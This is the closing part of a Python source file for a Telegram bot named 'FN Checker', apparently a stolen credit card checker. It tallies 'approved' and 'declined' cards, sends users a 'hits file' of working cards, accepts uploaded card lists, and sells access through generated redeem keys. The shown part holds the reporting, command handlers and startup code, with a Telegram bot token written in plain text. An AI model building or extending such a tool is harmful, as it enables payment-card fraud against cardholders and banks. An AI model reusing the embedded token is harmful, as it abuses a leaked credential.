[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        
        # Generate and send hits file
        try:
            hits_file = await self.generate_hits_file(stats['approved_ccs'], stats['total'])
            await update.message.reply_document(
                document=open(hits_file, 'rb'),
                caption="FN Checker Results Attached"
            )
            os.remove(hits_file)
        except Exception as e:
            logger.error(f"Failed to send hits file: {str(e)}")
        
        await self.send_message(update, report)
        del self.user_stats[user_id]

    async def show_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_stats:
            await self.send_message(update, "📊 No statistics available")
            return
            
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        await self.send_message(update, message)

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.active_tasks:
            self.active_tasks[user_id].cancel()
            del self.active_tasks[user_id]
            await self.send_message(update, "⏹️ Process cancelled")
            if user_id in self.user_stats:
                del self.user_stats[user_id]
        else:
            await self.send_message(update, "⚠️ No active process")

    async def send_message(self, update, text):
        try:
            await update.message.reply_text(text, parse_mode='HTML')
        except:
            try:
                await update.callback_query.message.reply_text(text, parse_mode='HTML')
            except:
                logger.error("Failed to send message")

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.error(msg="Exception:", exc_info=context.error)
        await self.send_message(update, f"⚠️ System Error: {str(context.error)}")

def main():
    checker = AdvancedCardChecker()
    application = Application.builder().token("8122009466:AAFb7ZHkZR7UsVvQVwRIL4PPLWg0YwdSPvw").post_init(checker.post_init).build()
    checker.application = application
    
    handlers = [
        CommandHandler('start', checker.start),
        CommandHandler('allow', checker.handle_admin_command),
        CommandHandler('deny', checker.handle_admin_command),
        CommandHandler('stop', checker.stop_command),
        CommandHandler('stats', checker.show_stats),
        CommandHandler('help', checker.show_help),
        CommandHandler('chk', checker.chk_command),
        CommandHandler('broadcast', checker.broadcast_command),
        CommandHandler('genkey', checker.genkey_command),
        CommandHandler('redeem', checker.redeem_command),
        MessageHandler(filters.Document.TXT, checker.handle_file),
        CallbackQueryHandler(checker.button_handler)
    ]
    
    for handler in handlers:
        application.add_handler(handler)

    application.add_error_handler(checker.error_handler)
    application.run_polling()


if __name__ == "__main__":
    main()